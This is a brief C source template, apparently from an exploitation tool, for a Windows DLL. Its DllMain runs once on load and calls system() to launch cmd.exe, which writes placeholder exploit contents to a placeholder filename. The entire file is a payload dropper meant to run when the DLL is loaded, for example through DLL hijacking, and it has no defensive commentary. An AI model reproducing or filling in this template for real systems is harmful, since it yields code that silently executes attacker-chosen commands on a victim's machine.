#include <stdlib.h>

int __stdcall DllMain(
    void *hinstDLL,  // handle to DLL module
    unsigned long fdwReason,     // reason for calling function
    void *lpvReserved )  // reserved
{
    static int run = 0;
    if (!run) {
        system("start cmd.exe /c \"echo {{EXPLOIT_CONTENTS}} > {{EXPLOIT_FILENAME}}\"");
        run = 1;
    }
    return 1;  // Successful DLL_PROCESS_ATTACH.
}